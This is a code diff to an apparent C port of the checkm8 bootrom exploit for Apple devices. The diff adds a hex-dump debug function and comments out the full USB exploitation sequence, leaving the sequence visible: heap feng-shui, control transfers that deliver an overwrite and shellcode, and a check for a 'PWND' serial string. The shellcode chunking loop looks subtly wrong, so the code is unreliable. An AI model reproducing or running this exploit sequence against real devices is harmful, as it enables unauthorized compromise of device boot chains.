@@ -41,6 +41,8 @@ void sleep_ms(int milliseconds) { // cross-platform sleep function
 #endif
 }
 
+void print_hex(uint8_t* str, int lines);
+
 int exploit() {
     printf("[x] *** checkm8 exploit by axi0mX ***\n");
 
@@ -99,53 +101,54 @@ int exploit() {
     printf("\tmain:\n\t\tfinal_shellcode.size: 0x%03x\n", final_shellcode.size);
 
     v8 overwrite = create_overwrite(0x10000A9C4, 0x18001C020);
+    print_hex(final_shellcode.data, 0xc00);
 
-    aquire_device();
+    // aquire_device();
 
-    printf("[x]\tStage1: Heap feng-shui...\n");    
+    // printf("[x]\tStage1: Heap feng-shui...\n");    
 
     // t8015: large_leak=None, hole=6, leak=1
-    stall();
-    for (int i = 0; i < 6; i++) {
-        no_leak();
-    }
-    usb_req_leak();
-    no_leak();
+    // stall();
+    // for (int i = 0; i < 6; i++) {
+    //     no_leak();
+    // }
+    // usb_req_leak();
+    // no_leak();
 
-    reset_device();
-    release_device();
+    // reset_device();
+    // release_device();
 
-    printf("[x]\tStage2: Reopening device without clearing global vars...\n");
-    aquire_device();
-    async_ctrl_transfer(0x21, 1, 0, 0, a800, 0.0001);
-    no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
-    release_device();
+    // printf("[x]\tStage2: Reopening device without clearing global vars...\n");
+    // aquire_device();
+    // async_ctrl_transfer(0x21, 1, 0, 0, a800, 0.0001);
+    // no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
+    // release_device();
 
-    sleep_ms(500);
+    // sleep_ms(500);
 
-    printf("[x]\tStage3: Exploiting...\n");
+    // printf("[x]\tStage3: Exploiting...\n");
     
-    aquire_device();
-    usb_req_stall();
-    usb_req_leak();
-    no_error_ctrl_transfer(0, 0, 0, 0, overwrite.data, overwrite.size, 100);
-    for (int i = 0; i < final_shellcode.size; i += 0x800) {
-        uint8_t* data_chunk = calloc(0x800, 1);
-        memset(data_chunk, final_shellcode.data[i * 0x800], 0x800);
-        async_ctrl_transfer(0x21, 1, 0, 0, data_chunk, 100);
-        free(data_chunk);
-    }
+    // aquire_device();
+    // usb_req_stall();
+    // usb_req_leak();
+    // no_error_ctrl_transfer(0, 0, 0, 0, overwrite.data, overwrite.size, 100);
+    // for (int i = 0; i < final_shellcode.size; i += 0x800) {
+    //     uint8_t* data_chunk = calloc(0x800, 1);
+    //     memset(data_chunk, final_shellcode.data[i * 0x800], 0x800);
+    //     async_ctrl_transfer(0x21, 1, 0, 0, data_chunk, 100);
+    //     free(data_chunk);
+    // }
 
-    reset_device();
-    release_device();
-    aquire_device();
+    // reset_device();
+    // release_device();
+    // aquire_device();
 
-    char* serial = (char*)get_serial_string();
-    printf("%s\n", serial);
-    if(strstr(serial, "PWND") == NULL) {
-        printf("Exploit failed\n");
-        exit(EXIT_FAILURE);
-    }
+    // char* serial = (char*)get_serial_string();
+    // printf("%s\n", serial);
+    // if(strstr(serial, "PWND") == NULL) {
+    //     printf("Exploit failed\n");
+    //     exit(EXIT_FAILURE);
+    // }
 
     return status;
 }
@@ -175,4 +178,14 @@ int main(int argc, char const *argv[])
     }
     exit_ctx();
     return status;
+}
+
+void print_hex(uint8_t* data, int lines) {
+    for (int i = 0; i < lines; i += 0x10) {
+        for (int j = 0; j < 16; j++) {
+            printf("%02x ", data[i + j]);
+            if (j == 7) printf(" ");
+        }
+        printf("\n");
+    }
 }
